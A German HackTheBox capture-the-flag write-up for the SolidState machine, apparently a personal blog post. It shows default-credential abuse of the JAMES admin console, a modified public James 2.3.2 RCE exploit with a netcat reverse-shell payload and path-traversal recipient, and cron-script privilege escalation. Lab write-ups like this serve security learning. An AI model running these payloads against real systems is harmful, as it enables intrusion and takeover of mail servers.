---
title: "HackTheBox - SolidState WriteUp | Tipps + Anleitung"
date: 2018-01-27T20:00:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
  - german
---

[SolidState](https://www.hackthebox.eu/home/machines/profile/85) ist eine der vielen Verfügbaren CTF Challenges von [HackTheBox](https://hackthebox.eu/). [SolidState](https://www.hackthebox.eu/home/machines/profile/85) ist eine leichte bis mittelschwere Maschine von [HackTheBox](https://hackthebox.eu/).

[![Difficulty](https://imgur.com/1Dp4yA7.jpg)](https://imgur.com/1Dp4yA7)

## **Tipps**

- Scanne mit Nmap alle Ports.
- Informiere dich was JAMES ist. Außerdem ist Telnet dein Freund.
- Um nicht eine eingeschränkte Bash-Shell (rbash) zu haben, musst du einen JAMES Exploit benutzen.
- Benutze [LinEnum.sh](https://github.com/rebootuser/LinEnum) mit der Option **-t**.
- Sieh dir bei den LinEnum Ergebnis **World-writable files** genau an.

## **Video**

[![video walkthrough](http://img.youtube.com/vi/VswM2eqrTk4/0.jpg)](http://www.youtube.com/watch?v=VswM2eqrTk4)

## **Anleitung**

Zuerst wie gewohnt ein Nmap-Scan. Hierbei ist es wichtig, dass wir explizit alle Ports scannen, da bei einem Standard-Scan ein offener Port nicht gefunden wird. Mit der Option **-p-** scannen wir alle Ports. Die Option **-A** sorgt dafür, dass Nmap das Betriebssystem und die Services herausfindet.

```shell
root@kali:~# nmap -A -p- 10.10.10.51
[...]
PORT     STATE SERVICE VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
[...]
```

[JAMES](https://de.wikipedia.org/wiki/Apache_James) ist ein Mailserver. Der Port 4555 mit dem Service **james-admin** sieht vielversprechend aus.

Versuchen wir doch mal eine Telnet-Verbindung zum Port 4555 aufzubauen.

```shell
root@kali:/home/SolidState# telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Die Standard Credentials für das **JAMES Remote Administration Tool** ist root / root. Ein Glück, dass dieses noch nicht geändert wurde.

```shell
>>help
Currently implemented commands:
help display this help
listusers display existing accounts
[...]
setpassword [username] [password] sets a user's password
[...]
quit close connection
```

Die für uns interessanten Befehle sind **listusers** und **setpassword**.

```shell
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```

Wir sehen 6 verschiedene Accounts. Wir können nun die Passwörter dieser Accounts mit Hilfe von **setpassword [username] [password]** ändern, um uns als diese anmelden zu können.

```shell
>>setpassword mindy m10x
Password for mindy reset

>>quit
Bye
Connection closed by foreign host.
```

Verbinden wir uns nun per Telnet mit dem POP3 Service. Eine Liste mit den möglichen Befehlen für [POP3](http://www.suburbancomputer.com/tips_email.htm) kannst du hier finden.

```shell
root@kali:/home/SolidState# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready

user mindy
+OK

pass m10x
+OK Welcome mindy

list
+OK 2 1945
1 1109
2 836
.

retr 2
+OK Message follows
[...]
Dear Mindy,
Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
.

quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```

Wir haben nun die SSH-Login Daten. Allerdings können wir damit noch nicht soviel anfangen, da wir durch den Login als Mindy nur eine [eingeschränkte Bash-Shell (rbash)](https://www.tecchannel.de/a/ratgeber-shells-fuer-linux-und-unix-richtig-nutzen,2038218,4) haben, bei welcher nur die Befehle **cat** und **ls** erlaubt sind. Bei den anderen Emails ist nichts interessantes zu finden. Was nun?

Suchen wir doch mal nach Schwachstellen im Bezug auf JAMES mit der Version 2.3.2.

```shell
root@kali:/home/SolidState# searchsploit james 2.3.2
-------------------------------------------------------------------------------------
Exploit Title                                        | Path
                                                     | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------
Apache James Server 2.3.2 - Remote Command Execution | exploits/linux/remote/35513.py
-------------------------------------------------------------------------------------
```

**Remote Command Execution **klingt doch nett. [Hier](https://www.exploit-db.com/exploits/35513/) ist der Link zu dem Exploit.

Kopieren wir uns das Script.

```shell
root@kali:/home/SolidState# cp /usr/share/exploitdb/exploits/linux/remote/35513.py /home/SolidState/james.py
```

Jetzt müssen wir es nur noch anpassen. Als Payload können wir ein [Netcat Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) benutzen. Außerdem können wir noch den **hostname** festlegen, welcher hier **solidstate** ist.

```shell
root@kali:/home/SolidState# vi james.py
payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.222 1234 >/tmp/f' #Zeile19
[...]
#also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@solidstate>\r\n") #zeile 59
```

Nun hören wir mit Netcat den Port ab, den wir im Script vorhin festgelegt haben.

```shell
root@kali:/home/SolidState# nc -lnvp 1234
listening on [any] 1234 ...
```

Parallel dazu führen wir das Script aus.

```shell
root@kali:/home/SolidState# python james.py
[-]Usage: python james.py <ip>
[-]Exemple: python james.py 127.0.0.1
root@kali:/home/SolidState# python james.py 10.10.10.51
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

Jetzt muss sich nur noch jemand über SSH anmelden!

```shell
root@kali:/home/SolidState# ssh mindy@10.10.10.51
mindy@10.10.10.51's password:
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
[...]
```

Wir haben Zugriff!

Nun können wir die Shell zu einer [fully interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) upgraden, damit wir **autocomplete, su etc.** haben.

```shell
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

Mit Hilfe von **wget** können wir [LinEnum.sh](https://github.com/rebootuser/LinEnum) downloaden (nachdem wir bei uns den Apache2 Server durch **service apache2 start** gestartet und die Datei in den Ordner **/var/www/html/** kopiert haben) und ausführen, welches uns die Enumeration und Privilege Escalation Checks abnimmt.

```shell
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget 10.10.15.222/LinEnum.sh

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ bash LinEnum.sh -t
[...]
World-writable files (excluding /proc):
-rwxrwxrwx 1 root root 91 Jan 21 18:34 /opt/tmp.py
[...]
```

Das Script hat eine Datei gefunden, welche dem User und der Gruppe **root** gehört, aber für jeden schreib-, lese- und ausführbar ist.

Sehen wir uns doch mal an, was sich in dem Python-Script steht.

```shell
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ vi /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     
sys.exit()
```

Wir können nun die 5\. Zeile etwas abändern...

```shell
os.system('cat /root/root.txt > /tmp/m10x.txt')
```

Wenn wir nun ein wenig warten, wird **tmp.py** ausgeführt und unter **/tmp/m10x.txt** können wir dann den Root-Hash finden. Anscheinend ist **/opt/tmp.py** ein Cron-Job!

```shell
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls /tmp/
m10x.txt
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /tmp/m10x.txt
b4c#########ZENSIERT#########7c9
```

Der User-Hash befindet sich unter **/home/mindy/user.txt**.

Vielen Dank für's durchlesen. :D